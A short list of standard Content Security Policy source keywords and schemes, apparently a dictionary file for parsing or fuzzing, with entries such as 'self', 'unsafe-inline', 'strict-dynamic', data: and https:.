# CSP Sources
"'self'"
"'none'"
"'unsafe-inline'"
"'unsafe-eval'"
"'strict-dynamic'"
"'unsafe-hashes'"
"'report-sample'"
"data:"
"blob:"
"filesystem:"
"https:"
